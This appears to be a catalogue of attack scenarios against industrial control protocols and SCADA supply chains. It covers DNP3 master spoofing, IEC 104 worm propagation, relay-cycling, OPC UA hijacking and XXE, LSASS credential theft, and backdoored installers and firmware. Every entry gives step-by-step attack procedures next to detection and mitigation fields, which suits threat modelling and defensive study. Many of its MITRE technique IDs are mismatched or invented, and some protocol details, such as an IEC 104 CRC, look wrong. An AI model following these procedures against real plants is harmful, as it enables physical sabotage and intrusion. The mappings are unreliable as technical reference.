- **Attack Type**: Worm Propagation
- **Target**: IEC 104 Devices
- **Vulnerability**: No segmentation or authentication
- **MITRE**: T0866 (Worm Propagation)
- **Impact**: Full ICS spread, uncontrolled commands
- **Tools**: Conficker Script, Python, Wireshark
- **Scenario**: Emulating Conficker-style self-replicating payload using unsegmented IEC 104 networks.
- **Attack Steps**: Step 1: Develop Python worm that scans subnet for IEC 104 port (TCP 2404).Step 2: Upon detection, connect and send “IC” command to confirm response.Step 3: Inject shellcode or second-stage script via known software vulnerability.Step 4: Use target to scan next subnet and repeat.Step 5: Log infection tree.Step 6: Deploy Wireshark to monitor traffic burst.Step 7: Kill process and clean artifacts.
- **Detection**: Detect port scans & burst traffic
- **Solution**: Network segmentation, port isolation
- **Tags**: iec104, worm, propagation

## OPC UA Session Timeout Exploit

- **Attack Type**: Session Expiry Abuse
- **Target**: OPC UA Client
- **Vulnerability**: Poor session token validation
- **MITRE**: T1499 (Service Disruption)
- **Impact**: Client HMI instability
- **Tools**: Wireshark, UA Flooder Script
- **Scenario**: Forcing OPC UA client disconnections by manipulating session timeout packets.
- **Attack Steps**: Step 1: Identify active OPC UA session timeout using Wireshark.Step 2: Send malicious keep-alive packets with invalid tokens.Step 3: Force the server to reject the client due to session mismatch.Step 4: Client drops connection and needs manual restart.Step 5: Automate disruption in intervals.Step 6: Observe operational disruptions at HMI.Step 7: Reconnect with legit client and restore system.
- **Detection**: Session log anomaly detection
- **Solution**: Strong session handling & re-authentication
- **Tags**: opcua, session-abuse, disconnect

## DNP3 Address Scan for Slave IDs

- **Attack Type**: Slave ID Enumeration
- **Target**: DNP3 Devices
- **Vulnerability**: Open responses to unauthenticated scans
- **MITRE**: T1595 (Network Scanning)
- **Impact**: Exposure of device layout
- **Tools**: DNP3Scan Tool, Wireshark
- **Scenario**: Identifying all DNP3 slave devices by scanning valid Unit IDs and logging responses.
- **Attack Steps**: Step 1: Use DNP3Scan Tool to send requests with Unit IDs from 0–255.Step 2: Capture which Unit IDs respond with valid objects.Step 3: Map slave device presence by address.Step 4: Identify command-capable units vs read-only.Step 5: Save map for follow-up exploitation.Step 6: Repeat scan across segments if reachable.Step 7: Document slave addresses and roles.
- **Detection**: Log query volume and Unit ID ranges
- **Solution**: Rate limit queries, monitor scan patterns
- **Tags**: dnp3, scan, enumeration

## IEC 104 Injection via Compromised Engineering Workstation

- **Attack Type**: Man-in-the-Middle Packet Injection
- **Target**: IEC 104 Workstation
- **Vulnerability**: Trusted endpoint turned rogue
- **MITRE**: T1203 + T1565
- **Impact**: Unauthorized process change
- **Tools**: Responder, Python IEC 104 Injector
- **Scenario**: Using compromised Engineering Workstation to send forged IEC 104 control messages.
- **Attack Steps**: Step 1: Gain access to engineering workstation via phishing or USB drop.Step 2: Use Responder to capture credentials or escalate.Step 3: Deploy IEC 104 Injector script on the machine.Step 4: Craft command packet (e.g., breaker open) with valid session ID.Step 5: Inject into the control network.Step 6: HMI executes command as if from authorized user.Step 7: Monitor logs and operator response.
- **Detection**: Endpoint telemetry & session audit
- **Solution**: Endpoint hardening, isolate engineering network
- **Tags**: iec104, mitm, control-injection

## OPC UA Endpoint Spoofing with Fake Certificate

- **Attack Type**: Certificate Spoofing
- **Target**: OPC UA Clients
- **Vulnerability**: No certificate pinning
- **MITRE**: T1587.002 (Digital Certificate Abuse)
- **Impact**: Data theft, client redirection
- **Tools**: OpenSSL, Prosys UA SDK, Wireshark
- **Scenario**: Attacker creates a fake OPC UA server with similar endpoint and signs it with spoofed cert.
- **Attack Steps**: Step 1: Clone real server’s endpoint name and structure.Step 2: Generate fake certificate using OpenSSL with similar CN and O fields.Step 3: Host OPC UA service using Prosys UA SDK server.Step 4: Wait for misconfigured clients to auto-connect.Step 5: Serve fake data or collect client secrets.Step 6: Log connections and certificates accepted.Step 7: Terminate and compare cert fingerprints.
- **Detection**: Certificate mismatch monitoring
- **Solution**: Enforce certificate pinning & trust chain validation
- **Tags**: opcua, spoofing, cert-abuse

## IEC 104 Man-in-the-Middle With Packet Delay Injection

- **Attack Type**: Communication Manipulation
- **Target**: IEC 104 Control Channel
- **Vulnerability**: No timing validation
- **MITRE**: T1565.001 (Stored Data Manipulation)
- **Impact**: Time-lag induced wrong operator decisions
- **Tools**: Ettercap, Wireshark, NetEm
- **Scenario**: Attacker intercepts IEC 104 traffic and injects timed delays, causing operator confusion and process disruption.
- **Attack Steps**: Step 1: Set up Ettercap as MITM between HMI and RTU.Step 2: Use Wireshark to monitor ongoing IEC 104 packets.Step 3: Introduce delays using NetEm (tc qdisc) to hold packets before forwarding.Step 4: Observe lag in HMI updates or status refresh.Step 5: Inject delay on command acknowledgments.Step 6: Monitor operator confusion due to “lagging” system.Step 7: Log effects and cleanup MITM setup.
- **Detection**: Detect TCP delay & sync mismatch
- **Solution**: Use encrypted/timestamped comms
- **Tags**: iec104, delay, MITM

## OPC UA Anonymous Binding Exploit

- **Attack Type**: Unauthenticated Access
- **Target**: OPC UA Server
- **Vulnerability**: Anonymous login enabled
- **MITRE**: T1078 (Valid Accounts - Anonymous)
- **Impact**: Full tag visibility, limited write
- **Tools**: UA Expert, Python-opcua
- **Scenario**: OPC UA server accepts anonymous connections, allowing attacker to browse full tag space.
- **Attack Steps**: Step 1: Connect to OPC UA server using UA Expert with "Anonymous" user option.Step 2: Browse through address space.Step 3: Use Python-opcua to extract nodes and live data values.Step 4: Write test values to writable nodes (if permitted).Step 5: Confirm value manipulation reflects on HMI.Step 6: Export node list and document findings.Step 7: Disconnect and verify logs.
- **Detection**: Review login methods in UA logs
- **Solution**: Disable anonymous access; enforce cert-based login
- **Tags**: opcua, anon-access, browse

## DNP3 Fragmentation Attack

- **Attack Type**: Packet Fragment Exploitation
- **Target**: DNP3 Slave
- **Vulnerability**: Poor reassembly validation
- **MITRE**: T1499 (DoS)
- **Impact**: Slave hangs or ignores all further messages
- **Tools**: Scapy, Wireshark, DNP3 Fuzzer
- **Scenario**: Splitting commands into fragments and mixing with false segments to confuse slave.
- **Attack Steps**: Step 1: Capture standard fragmented packets using Wireshark.Step 2: Using Scapy or DNP3 Fuzzer, send partial command frames.Step 3: Interleave valid and invalid fragments.Step 4: Monitor target DNP3 slave for command timeout, reassembly error, or crash.Step 5: Trigger retries from Master.Step 6: Observe loss of functionality or delayed actuation.Step 7: Record packet logs.
- **Detection**: Analyze fragment integrity
- **Solution**: Apply DNP3 Secure Authentication & robust parsing
- **Tags**: dnp3, fragmentation, dos

## OPC Classic Registry Key Tampering

- **Attack Type**: Persistence via Registry
- **Target**: OPC Classic Windows Server
- **Vulnerability**: Writable registry + no ACLs
- **MITRE**: T1547.001 (Registry Run Keys)
- **Impact**: Persistent malware at startup
- **Tools**: Regedit, Sysinternals Autoruns, PowerShell
- **Scenario**: Attacker modifies OPC server registry keys to maintain persistence and autorun malicious modules.
- **Attack Steps**: Step 1: Gain access to OPC host (via phishing or USB drop).Step 2: Open Regedit and browse to HKLM\SOFTWARE\OPC.Step 3: Modify CLSID paths to redirect DLL calls to attacker’s file.Step 4: Use Autoruns to confirm startup behavior.Step 5: Restart OPC service and check if payload runs.Step 6: Use PowerShell to monitor process creation.Step 7: Remove malicious entries post-test.
- **Detection**: Monitor registry changes with Sysmon
- **Solution**: Lock registry keys, enforce ACLs
- **Tags**: opc, registry, persistence

## IEC 104 Fake Sensor Simulation

- **Attack Type**: Sensor Data Emulation
- **Target**: HMI / Control Panel
- **Vulnerability**: No sensor verification/auth
- **MITRE**: T0853.002 (Sensor Spoofing)
- **Impact**: False safety alarms, downtime
- **Tools**: IEC 104 Python Emulator, Wireshark
- **Scenario**: Attacker simulates a virtual RTU sending fake temperature/pressure readings.
- **Attack Steps**: Step 1: Create IEC 104 client using Python IEC 104 Library.Step 2: Emulate a slave device responding to IC (interrogation commands).Step 3: Send false data with high/critical values (e.g., “Overpressure”).Step 4: HMI reflects dangerous readings.Step 5: Observe operator reaction and safety protocol engagement.Step 6: Analyze if system auto-trips or alarms.Step 7: Stop emulation and restore environment.
- **Detection**: Compare sensor ID & data source logs
- **Solution**: Validate source identity before accepting data
- **Tags**: iec104, sensor-spoof, emulation

## OPC UA Attribute Write Overflow

- **Attack Type**: Buffer Overflow via Node Attribute
- **Target**: OPC UA Server
- **Vulnerability**: No length limit on attributes
- **MITRE**: T1203 (Exploit via Input Validation)
- **Impact**: Server crash, remote code risk
- **Tools**: Python-opcua, UA Expert, Metasploit
- **Scenario**: Overflow OPC UA attribute buffer by writing extremely large strings to a field.
- **Attack Steps**: Step 1: Identify writable nodes using UA Expert.Step 2: Use Python-opcua to write a payload >10,000 characters into a string field.Step 3: Monitor server CPU/memory with Task Manager.Step 4: Observe possible crash, freeze, or restart of OPC server.Step 5: (Optional) Use Metasploit to attempt post-overflow shell injection.Step 6: Reboot and verify persistence.Step 7: Analyze logs and server dump.
- **Detection**: Memory usage spike alerts
- **Solution**: Enforce strict attribute input validation
- **Tags**: opcua, overflow, fuzz

## DNP3 Binary Counter Reset Spoof

- **Attack Type**: False Reset Trigger
- **Target**: DNP3 Counter
- **Vulnerability**: No source validation for resets
- **MITRE**: T0853.003 (False Reset Commands)
- **Impact**: Falsified system reboots
- **Tools**: Scapy, Wireshark
- **Scenario**: Send crafted DNP3 packet that resets binary counter, simulating equipment reset.
- **Attack Steps**: Step 1: Capture valid counter packets using Wireshark.Step 2: Identify correct object group (e.g., 20 - Binary Counter).Step 3: Craft DNP3 packet using Scapy with reset bit set.Step 4: Spoof Master IP and send to RTU.Step 5: RTU resets counter – operator thinks system rebooted.Step 6: Monitor confusion and false alarms.Step 7: Document exact data object affected.
- **Detection**: Monitor reset flags from non-operator IPs
- **Solution**: Use source authentication and access control
- **Tags**: dnp3, counter-reset, spoof

## OPC Classic Shared Memory Poisoning

- **Attack Type**: Interprocess Memory Attack
- **Target**: OPC Classic
- **Vulnerability**: No protection on IPC memory
- **MITRE**: T1499.003 (Memory Injection)
- **Impact**: Data tampering or process hijack
- **Tools**: WinDbg, Process Hacker, Custom DLL
- **Scenario**: Poison shared memory between OPC client and server to inject malicious data.
- **Attack Steps**: Step 1: Launch OPC Client and Server.Step 2: Identify shared memory region using Process Hacker.Step 3: Inject custom DLL using WinDbg.Step 4: Overwrite shared memory with altered data or shellcode.Step 5: Server responds with tampered process values.Step 6: Log crash or response pattern.Step 7: Clear shared memory before exit.
- **Detection**: Use Sysmon to detect shared memory tampering
- **Solution**: Isolate processes with memory ACLs
- **Tags**: opc, memory-attack, ipc

## IEC 104 False Quality Bit Injection

- **Attack Type**: Data Integrity Tampering
- **Target**: IEC 104 HMI
- **Vulnerability**: No validation of quality field
- **MITRE**: T1609 (Data Field Manipulation)
- **Impact**: Loss of trust in sensor data
- **Tools**: IEC 104 Python Script, Wireshark
- **Scenario**: Alter quality bit in IEC 104 ASDU to make data appear invalid or uncertain.
- **Attack Steps**: Step 1: Capture real ASDU messages using Wireshark.Step 2: Craft ASDU with quality bit set to 0x80 (invalid).Step 3: Inject packet using custom Python IEC 104 script.Step 4: Observe HMI marks sensor as unreliable.Step 5: Trigger redundant fallback systems.Step 6: Record response sequence.Step 7: Restore normal state for validation.
- **Detection**: Alert on sudden invalid quality bits
- **Solution**: Enforce CRC & quality verification
- **Tags**: iec104, qualitybit, integrity

## OPC UA Subscription Hijack

- **Attack Type**: Unauthorized Data Access
- **Target**: OPC UA Server
- **Vulnerability**: Weak session binding
- **MITRE**: T1071.001 (Application Protocol Abuse)
- **Impact**: Secret access to process data
- **Tools**: UA Expert, Python-opcua, Wireshark
- **Scenario**: Attacker steals session ID and rebinds subscription to receive live updates.
- **Attack Steps**: Step 1: Capture OPC UA traffic with Wireshark.Step 2: Identify active session and subscription ID.Step 3: Reconnect to OPC UA server using Python-opcua.Step 4: Reuse Session ID to hijack subscription.Step 5: Monitor live updates like an authorized client.Step 6: Stealthily extract critical process values.Step 7: Log subscription behavior and alerts.
- **Detection**: Session audit logs & duplicate connections
- **Solution**: Strong session token rotation & TLS binding
- **Tags**: opcua, hijack, subscription

## IEC 104 Malformed StartDT Act Flood

- **Attack Type**: DoS via Session Flood
- **Target**: IEC 104 Server
- **Vulnerability**: No flood protection
- **MITRE**: T1499.004 (Protocol Flood)
- **Impact**: System slowdown or denial of connection
- **Tools**: Scapy, Wireshark
- **Scenario**: Repeatedly sending malformed "Start Data Transfer Acknowledge" messages to overwhelm IEC 104 stack.
- **Attack Steps**: Step 1: Analyze valid IEC 104 StartDT Act packets using Wireshark.Step 2: Use Scapy to craft malformed StartDT packets (bad length, missing flags).Step 3: Send multiple malformed packets per second to IEC 104 server.Step 4: Observe CPU/memory usage on target using Task Manager or htop.Step 5: Server may crash, stall, or refuse new connections.Step 6: Collect server logs to verify flooding.Step 7: Stop flood and allow server to recover.
- **Detection**: Log excessive StartDT requests
- **Solution**: Rate limit session initiation
- **Tags**: iec104, flood, dos

## OPC UA XML External Entity (XXE) Attack

- **Attack Type**: Config File Exploit
- **Target**: OPC UA Client
- **Vulnerability**: XXE in XML parsing
- **MITRE**: T1221 (XML External Entities)
- **Impact**: Local file exposure or crash
- **Tools**: Burp Suite, OPC UA Client, XXE payloads
- **Scenario**: OPC UA client parses external XML during tag config import, exposing local files.
- **Attack Steps**: Step 1: Identify an OPC UA client that supports XML config import.Step 2: Craft an XML file with an embedded XXE payload that references /etc/passwd or C:\boot.ini.Step 3: Import the XML using the OPC UA client.Step 4: Use Burp Suite or logs to capture file output.Step 5: Verify exfiltration of system file data.Step 6: Observe crash if invalid file path used.Step 7: Remove malicious config and restore settings.
- **Detection**: Monitor external entity resolution
- **Solution**: Use safe XML parsers, disable external access
- **Tags**: opcua, xxe, xml

## DNP3 Clock Sync Abuse

- **Attack Type**: Time Drift Injection
- **Target**: DNP3 Slave
- **Vulnerability**: No time validation/auth
- **MITRE**: T1602 (Time Manipulation)
- **Impact**: Inaccurate logs & event timelines
- **Tools**: Scapy, Wireshark, Python-DNP3
- **Scenario**: Attacker sends clock synchronization messages to slowly desynchronize DNP3 slave device logs.
- **Attack Steps**: Step 1: Use Wireshark to find Time Sync messages (Function Code 45).Step 2: Clone and modify time to be slightly ahead (e.g., +1min).Step 3: Craft packet using Python-DNP3 or Scapy.Step 4: Send new time sync to slave every 10 minutes.Step 5: After 1 hour, log desynchronization of 6+ mins.Step 6: Check audit logs vs real event time.Step 7: Stop attack and resync with NTP.
- **Detection**: Clock drift detection
- **Solution**: Use authenticated time sync methods
- **Tags**: dnp3, time-drift, log-tampering

## IEC 104 Client Certificate Swap

- **Attack Type**: Unauthorized Access
- **Target**: IEC 104 Server
- **Vulnerability**: No cert pinning or strong validation
- **MITRE**: T1587.002 (Certificate Spoofing)
- **Impact**: Gained unauthorized access
- **Tools**: OpenSSL, IEC 104 Client, MITMproxy
- **Scenario**: Attacker replaces trusted client certificate to impersonate legitimate control application.
- **Attack Steps**: Step 1: Extract legitimate client certificate chain.Step 2: Create spoofed certificate with similar CN using OpenSSL.Step 3: Use MITMproxy to insert spoofed cert in TLS session.Step 4: Connect to IEC 104 server using impersonated identity.Step 5: Send control commands as trusted entity.Step 6: Monitor execution of unauthorized actions.Step 7: Restore original cert and remove traces.
- **Detection**: Compare cert fingerprint logs
- **Solution**: Enable cert pinning & strict CA trust
- **Tags**: iec104, tls, spoof-cert

## OPC UA Discovery Server Enumeration

- **Attack Type**: Node Discovery
- **Target**: OPC UA Discovery Server
- **Vulnerability**: Open discovery port
- **MITRE**: T1590.002 (Service Discovery)
- **Impact**: Full visibility into OPC structure
- **Tools**: UA Expert, Nmap, OPC UA Discovery CLI
- **Scenario**: Abusing OPC UA Discovery service to locate all exposed nodes across the network.
- **Attack Steps**: Step 1: Use Nmap with OPC UA detection script (opc-ua-info.nse) to locate discovery servers.Step 2: Use UA Expert or OPC UA CLI to query each endpoint.Step 3: Retrieve full list of server URIs and exposed namespaces.Step 4: Identify unsecured servers or test/dev instances.Step 5: Log each server’s tag exposure level.Step 6: Optionally connect and read from insecure nodes.Step 7: Save discovery list for mapping.
- **Detection**: Detect high-volume endpoint queries
- **Solution**: Restrict discovery access to trusted clients
- **Tags**: opcua, discovery, endpoint-enum

## DNP3 Spontaneous Message Flood

- **Attack Type**: Bandwidth Exhaustion
- **Target**: DNP3 Master
- **Vulnerability**: No control over unsolicited messages
- **MITRE**: T1498 (Network DoS)
- **Impact**: Network congestion, missed alerts
- **Tools**: DNP3 Simulator, Scapy, Wireshark
- **Scenario**: Flooding the master with spontaneous (unsolicited) data from fake slaves.
- **Attack Steps**: Step 1: Configure multiple DNP3 slave emulators on different IPs.Step 2: Set all slaves to send unsolicited messages frequently (e.g., every 2s).Step 3: Use Scapy to inject additional spontaneous packets.Step 4: Monitor master bandwidth and CPU usage.Step 5: Observe log overflow or dropped data.Step 6: Record threshold where master becomes unresponsive.Step 7: Halt simulation and review logs.
- **Detection**: Monitor spontaneous data rates
- **Solution**: Limit unsolicited sources; add filters
- **Tags**: dnp3, flood, spontaneous

## IEC 104 Fake Redundancy Switch Trigger

- **Attack Type**: Failover Disruption
- **Target**: Redundant Control System
- **Vulnerability**: Trusts failover signals blindly
- **MITRE**: T0858.003 (Redundancy Spoofing)
- **Impact**: Dual operation or conflict
- **Tools**: Scapy, IEC 104 Python Library
- **Scenario**: Attacker fakes a failover signal, tricking system into activating backup unnecessarily.
- **Attack Steps**: Step 1: Identify redundancy trigger signal format in IEC 104 (e.g., ASDU Type 6).Step 2: Use Scapy to craft a false failover signal.Step 3: Send packet while primary device is still active.Step 4: Observe backup system activates prematurely.Step 5: Log dual system conflict and process impact.Step 6: Review logs for duplication/conflict.Step 7: Stop fake signal and reset redundancy logic.
- **Detection**: Alert on premature failover triggers
- **Solution**: Authenticate redundancy signals
- **Tags**: iec104, failover, spoof

## OPC Classic COM Object Abuse for Lateral Movement

- **Attack Type**: Internal Movement
- **Target**: Windows ICS System
- **Vulnerability**: Exposed OPC COM objects
- **MITRE**: T1021.003 (Remote Services - DCOM)
- **Impact**: Remote code execution
- **Tools**: WMIC, PowerShell, DCOM Exploit Script
- **Scenario**: Using registered OPC COM objects to move laterally to another system.
- **Attack Steps**: Step 1: On an internal compromised system, run wmic /node:target COMClass to enumerate OPC classes.Step 2: Use PowerShell to activate remote object via DCOM.Step 3: Inject commands through OPCServer.Connect method.Step 4: Establish reverse shell if write access is available.Step 5: Log event viewer messages on remote machine.Step 6: Maintain persistence via DCOM startup script.Step 7: Clean registry trace post-test.
- **Detection**: DCOM connection event logs
- **Solution**: Harden DCOM access, segment OPC services
- **Tags**: opc, dcom, lateral

## DNP3 Function Code Abuse for Mass Relay Operation

- **Attack Type**: Bulk Command Attack
- **Target**: DNP3 Relay
- **Vulnerability**: No command rate-limiting
- **MITRE**: T0853.004 (Control Abuse)
- **Impact**: Mechanical stress or false trip
- **Tools**: Python-DNP3, Wireshark
- **Scenario**: Attacker sends multiple "Operate" commands using Function Code 5 in rapid sequence.
- **Attack Steps**: Step 1: Identify valid relays and addresses via Wireshark.Step 2: Craft a Python script using DNP3 library to send back-to-back Operate commands.Step 3: Set relay open/close rapidly in loop.Step 4: Observe breaker operation wear or system errors.Step 5: Monitor alarm logs and power fluctuation simulation.Step 6: Analyze HMI status flood.Step 7: Stop attack and restore normal state.
- **Detection**: Monitor relay cycling rate
- **Solution**: Enforce relay command limits
- **Tags**: dnp3, control-abuse, relay

## IEC 104 CRC Tampering for Data Disruption

- **Attack Type**: Integrity Attack
- **Target**: IEC 104 Server
- **Vulnerability**: Weak CRC enforcement
- **MITRE**: T1565.002 (Corruption of Transmitted Data)
- **Impact**: Data corruption or silent faults
- **Tools**: Scapy, IEC 104 Script
- **Scenario**: Attacker tampers with packet checksum to inject invalid data or corrupt communication.
- **Attack Steps**: Step 1: Capture valid IEC 104 packet and observe CRC value (checksum).Step 2: Use Scapy or script to modify data but keep CRC incorrect.Step 3: Send corrupted packet to IEC 104 server.Step 4: Target system accepts or rejects based on implementation.Step 5: Observe if corrupted data is accepted silently.Step 6: Monitor logging behavior.Step 7: Confirm whether disruption succeeded.
- **Detection**: CRC mismatch detection
- **Solution**: Enforce strict checksum validation
- **Tags**: iec104, crc-corrupt, tamper

## DNP3 Unauthenticated Master Spoof

- **Attack Type**: Spoofing Attack
- **Target**: DNP3 Slave
- **Vulnerability**: No source validation
- **MITRE**: T0853 (Protocol Abuse - Unauthenticated Control)
- **Impact**: Unauthorized device control
- **Tools**: Scapy, Python-DNP3, Wireshark
- **Scenario**: Attacker impersonates a DNP3 Master and sends control commands to slave RTUs without authentication.
- **Attack Steps**: Step 1: Use Wireshark to identify DNP3 slave IP and port (usually TCP 20000).Step 2: Analyze legitimate Master command structure, e.g., "Operate" with Function Code 5.Step 3: Craft spoofed packets using Scapy or Python-DNP3.Step 4: Send control command (e.g., breaker open/close) from attacker machine pretending to be the Master.Step 5: Observe physical or logical actuation at RTU.Step 6: Verify absence of authentication logs.Step 7: Roll back changes and log affected endpoints.
- **Detection**: Master IP duplication detection
- **Solution**: Use DNP3-SA (Secure Authentication) and source whitelisting
- **Tags**: dnp3, spoofing, master-emulation

## OPC UA Reverse Heartbeat Flood

- **Attack Type**: Keepalive Abuse
- **Target**: OPC UA Server
- **Vulnerability**: Weak session control, no rate limits
- **MITRE**: T1499.002 (Service Exhaustion)
- **Impact**: Sluggish performance, disconnections
- **Tools**: Python-opcua, UA Expert, Wireshark
- **Scenario**: Abusing OPC UA keepalive (heartbeat) traffic to flood a server, reducing performance.
- **Attack Steps**: Step 1: Identify heartbeat interval settings on client using UA Expert.Step 2: Create a Python-opcua script to simulate dozens of fake clients with rapid heartbeat (e.g., every 0.5 sec).Step 3: Send frequent PublishRequests and keepalives to OPC UA server.Step 4: Monitor CPU and memory usage of the server under load.Step 5: Observe delays in genuine tag updates or dropped sessions.Step 6: Compare normal vs attack traffic in Wireshark.Step 7: Kill processes and clear connection queue.
- **Detection**: Alert on session spike and heartbeat frequency
- **Solution**: Rate limit heartbeat frequency, monitor session caps
- **Tags**: opcua, heartbeat-flood, resource-exhaustion

## IEC 104 Redundant Data Loop Injection

- **Attack Type**: Network Congestion
- **Target**: IEC 104 RTU
- **Vulnerability**: No duplicate ASDU detection
- **MITRE**: T0853.002 (Data Flooding)
- **Impact**: Congestion, processing delays
- **Tools**: Scapy, IEC 104 Python Library
- **Scenario**: Attacker injects repeated duplicate ASDUs to create artificial data loops and stress RTU processing.
- **Attack Steps**: Step 1: Observe normal ASDU update frequency using Wireshark.Step 2: Craft identical ASDUs and resend them in a loop using Python IEC 104 script.Step 3: Inject high-frequency repeated packets with identical sequence numbers.Step 4: RTU struggles to process same info multiple times.Step 5: Observe CPU spike or backlog in processing.Step 6: Monitor system logs for repeated entries.Step 7: Halt loop and validate RTU recovery.
- **Detection**: Detect repeated ASDU sequences
- **Solution**: Add ASDU duplicate checks and buffer limits
- **Tags**: iec104, loop, packet-replay

## DNP3 Time-Variant Replay Attack

- **Attack Type**: Replay with Adjusted Timestamp
- **Target**: DNP3 Slave
- **Vulnerability**: No nonce or timestamp validation
- **MITRE**: T1631 (Replay Attack)
- **Impact**: Fake command accepted as real
- **Tools**: Wireshark, Scapy, Python-DNP3
- **Scenario**: Attacker captures real DNP3 packets and replays them after modifying timestamps to look recent.
- **Attack Steps**: Step 1: Capture live command packet from Master to Slave with Wireshark.Step 2: Export packet and extract command + timestamp field.Step 3: Modify the timestamp to reflect a recent value using Scapy or Python-DNP3.Step 4: Replay packet to slave device.Step 5: Slave accepts command, believing it's current.Step 6: Observe if action is repeated or conflicts with real-time logic.Step 7: Compare system logs for duplicate action patterns.
- **Detection**: Log timing anomalies
- **Solution**: Use secure DNP3 (SAv5) with anti-replay
- **Tags**: dnp3, replay, timestamp-manipulation

## OPC UA Fake Alarm Trigger Node Injection

- **Attack Type**: Fake Alert Generation
- **Target**: OPC UA Server
- **Vulnerability**: No control over node creation
- **MITRE**: T1565.002 (Fake Data Injection)
- **Impact**: Panic due to false alarms
- **Tools**: Python-opcua, UA Expert
- **Scenario**: Attacker adds a custom node in the OPC UA tree that triggers false high-priority alarms.
- **Attack Steps**: Step 1: Use UA Expert to identify the alarm namespace and parent node structure.Step 2: Create a custom alarm node using Python-opcua, naming it "Critical_Temp" or "OverVoltage".Step 3: Set its value above threshold (e.g., 9999°C).Step 4: Publish the value as an active alarm.Step 5: Observe the HMI alarm panel or alert system for response.Step 6: Log how system or operators react.Step 7: Delete injected node and restore normal operations.
- **Detection**: Validate node origin & hierarchy
- **Solution**: Limit node creation to admin roles
- **Tags**: opcua, fake-alert, node-injection

## Trojanized HMI Installer from Vendor Website

- **Attack Type**: Supply Chain Compromise
- **Target**: HMI Software
- **Vulnerability**: Lack of software integrity validation
- **MITRE**: T1195.002 (Compromise Software Supply Chain)
- **Impact**: Full compromise of HMI system, unauthorized SCADA control
- **Tools**: Custom Trojan, Burp Suite, Code-Signing Tool
- **Scenario**: An attacker replaces the legitimate HMI software installer on the vendor's website with a trojanized version containing backdoor access.
- **Attack Steps**: Step 1: Attacker compromises vendor’s website CMS via weak admin credentials. Step 2: Uploads a fake installer that looks identical to the original but contains backdoor code. Step 3: Installer maintains proper digital signature using a stolen or spoofed certificate. Step 4: End-user (engineering team) downloads and installs compromised HMI. Step 5: Backdoor opens outbound communication to attacker’s server. Step 6: Attacker now has remote access to the HMI and can manipulate or observe SCADA operations.
- **Detection**: File hash mismatch, unusual outbound connections
- **Solution**: Only download signed software; enforce code integrity checks
- **Tags**: HMI, VendorCompromise, Trojan, SupplyChain

## Backdoored PLC Programming Suite via Third-Party Mirror

- **Attack Type**: Supply Chain / Software Tampering
- **Target**: Engineering Workstation
- **Vulnerability**: No authenticity check for software sources
- **MITRE**: T1195.002
- **Impact**: Theft of proprietary PLC logic, process disruption, sabotage planning
- **Tools**: Custom Malware, Wireshark, Python Script
- **Scenario**: The attacker replaces a legitimate PLC programming tool on a third-party download mirror with a version that exfiltrates project files.
- **Attack Steps**: Step 1: Attacker targets a third-party software mirror hosting PLC tools. Step 2: Uploads a modified installer that embeds malware in the tool's runtime libraries. Step 3: Plant engineers download the tool unaware of compromise. Step 4: Malware activates upon PLC code editing, silently sends project files to attacker. Step 5: Attacker reverse engineers logic and identifies critical process vulnerabilities. Step 6: Uses knowledge to craft further attacks or blackmail.
- **Detection**: Monitor outbound traffic, integrity checking
- **Solution**: Always use vendor-official download channels; scan files
- **Tags**: PLC, Engineering, File Exfiltration, MirrorSite

## Compromised Automatic Software Update via Vendor Tool

- **Attack Type**: Supply Chain / Update Hijacking
- **Target**: SCADA Software
- **Vulnerability**: Insecure update channel (HTTP, no signature)
- **MITRE**: T1543.003 (Windows Service) + T1195.002
- **Impact**: Remote persistent access to SCADA; manipulation of process control
- **Tools**: Evilgrade, DNS Poisoning Tool, Burp Suite
- **Scenario**: Attacker hijacks automatic update channel of SCADA software tool to push malicious code under guise of update.
- **Attack Steps**: Step 1: Attacker identifies SCADA software performing insecure update over HTTP. Step 2: Performs MITM (man-in-the-middle) via ARP spoofing or DNS poisoning. Step 3: Responds to update request with fake update containing malware. Step 4: Update is accepted and installed automatically. Step 5: Malware establishes persistence and opens backdoor. Step 6: Attacker uses access to alter process data or introduce false readings.
- **Detection**: Network anomaly detection; monitoring process hash changes
- **Solution**: Secure updates via HTTPS and digital signatures
- **Tags**: MITM, UpdateHijack, SCADA, Persistence

## Embedded Backdoor in Vendor Firmware Before Shipment

- **Attack Type**: Supply Chain / Firmware Tampering
- **Target**: PLC
- **Vulnerability**: Tampered firmware, insecure supply chain
- **MITRE**: T1542.001 (Pre-OS Boot) + T1195.002
- **Impact**: Hidden long-term access to PLCs in the field
- **Tools**: Binwalk, Hex Editor, Firmware Toolkit
- **Scenario**: Attacker working inside or compromising SCADA vendor embeds a hidden firmware backdoor in PLCs before shipment.
- **Attack Steps**: Step 1: Attacker gains access to firmware build server at vendor premises. Step 2: Modifies firmware image to include hidden command listener on port 8888. Step 3: Repackages and signs firmware to avoid detection. Step 4: Compromised firmware is shipped to clients and installed in field PLCs. Step 5: Attacker connects to hidden port and sends control commands remotely. Step 6: Plant systems respond to unauthorized commands without user awareness.
- **Detection**: Monitor firmware hashes, unexpected open ports
- **Solution**: Verify firmware integrity; use JTAG-based inspection
- **Tags**: Firmware, PLC, EmbeddedBackdoor, FactoryInfection

## Compromised Vendor Support USB Tool

- **Attack Type**: Supply Chain / Physical Infection
- **Target**: Engineering Workstation
- **Vulnerability**: USB device auto-execution, lack of device control
- **MITRE**: T1200 (Hardware Additions) + T1056.001
- **Impact**: Remote compromise of air-gapped environments
- **Tools**: USB Rubber Ducky, HID Spoofing, Mimikatz
- **Scenario**: Vendor technician unknowingly uses infected USB tool during on-site maintenance, delivering malware to air-gapped SCADA.
- **Attack Steps**: Step 1: Attacker infects technician’s USB support tool used for diagnostics. Step 2: When technician plugs it into engineering workstation, it auto-executes payload. Step 3: Payload exfiltrates credentials from Windows LSASS. Step 4: Sends credentials to nearby rogue Wi-Fi AP controlled by attacker. Step 5: Attacker uses creds to access secure SCADA systems remotely. Step 6: Further malware can now be deployed internally.
- **Detection**: Disable autorun, monitor new device insertion
- **Solution**: Restrict USB usage, scan vendor devices
- **Tags**: USB, InsiderVector, PhysicalLayer, CredentialSteal

## Poisoned Software Development Kit (SDK) for SCADA APIs

- **Attack Type**: Supply Chain / SDK Poisoning
- **Target**: SDKs and HMI/RTU Integrations
- **Vulnerability**: Lack of code review in open vendor SDKs
- **MITRE**: T1554 (Compromise Software Dependencies)
- **Impact**: Disruption of industrial operations via hidden code
- **Tools**: IDA Pro, Git, Ghidra, Python, SCM tools
- **Scenario**: A malicious actor injects a logic bomb into the SCADA vendor’s official SDK used by multiple third-party SCADA developers.
